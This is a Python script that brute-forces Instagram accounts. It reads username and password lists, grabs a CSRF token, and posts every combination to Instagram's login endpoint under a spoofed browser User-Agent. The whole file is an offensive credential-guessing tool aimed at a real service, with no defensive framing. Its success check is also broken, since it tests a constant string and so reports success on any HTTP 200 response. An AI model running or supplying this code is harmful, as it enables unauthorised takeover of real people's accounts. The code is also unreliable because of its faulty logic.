import requests

# Function to load usernames and passwords
def load_usernames(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            usernames = file.read().splitlines()
        return usernames
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

def load_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
        return passwords
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

# Function to perform brute force login
def brute_force_login(url):
    # Load usernames and passwords
    usernames = load_usernames('usernames.txt')
    passwords = load_passwords('passwords.txt')
    
    if not usernames or not passwords:
        print("Usernames or passwords file is empty. Exiting.")
        return

    # Setup session and headers
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # Get Instagram's login page to retrieve CSRF token
    response = session.get(url, headers=headers)
    if response.status_code != 200:
        print("Failed to retrieve the login page.")
        return

    # Extract CSRF token from the page
    csrf_token = response.cookies.get('csrftoken', None)
    if not csrf_token:
        print("Failed to extract CSRF token.")
        return

    # Start the brute force attack
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    for username in usernames:
        for password in passwords:
            print(f"Attempting login with username: {username} and password: {password}")
            
            # Prepare login data
            data = {
                'username': username,
                'password': password,
                'csrfmiddlewaretoken': csrf_token,
            }

            # Send POST request to attempt login
            login_response = session.post(login_url, data=data, headers=headers, cookies={'csrftoken': csrf_token})

            if login_response.status_code == 200:
                # Check for successful login by inspecting response
                if "authenticated":  # This string might change based on Instagram's response
                    print("Brute force successful!")
                    return
                else:
                    print(f"Failed login attempt with username: {username} and password: {password}")
            else:
                print("Failed to login. Server error.")

    print("Brute force failed. No valid credentials found.")

# Main function
if __name__ == "__main__":
    login_url = "https://www.instagram.com/accounts/login/"
    brute_force_login(login_url)
